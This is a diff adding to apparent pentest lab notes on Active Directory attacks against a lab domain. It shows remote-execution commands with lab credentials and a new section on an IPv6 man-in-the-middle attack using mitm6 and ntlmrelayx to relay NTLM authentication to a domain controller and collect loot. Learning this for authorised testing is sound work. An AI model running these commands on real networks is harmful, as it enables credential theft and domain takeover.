@@ -86,3 +86,17 @@ syntax: wmiexec.py marvel.local/fcastle:Password1@10.0.1.6
 or
 
 syntax: smbexec.py marvel.local/fcastle:Password1@10.0.1.6
+
+4. IPv6 Attacks
+
+Most networks are still running on IPv4, but IPv6 is enabled and all machines also get an IPv6 IP. However, who is doing the DNS for IPv6? The answer is no one and this provides us with the opportunity to do a Man in the Middle attack against IPv6. 
+
+install MTIM6 from here: https://github.com/fox-it/mitm6
+
+once ready, run:
+syntax: mitm6 -d marvel.local
+then we need a relay:
+sudo ntlmrelayx.py -6 -t ldaps://10.0.1.4 -wh fakewpad.marvel.local -l lootme (most Domain Controls have the certificate installed, so LDAP Secure is good, we are doimg this on IPv6, hence the 6). 
+
+if you go to the lootme folder on Kali, once a computer has been rebooted or some time has passed, then you should see all sorts of interesting information. 
+
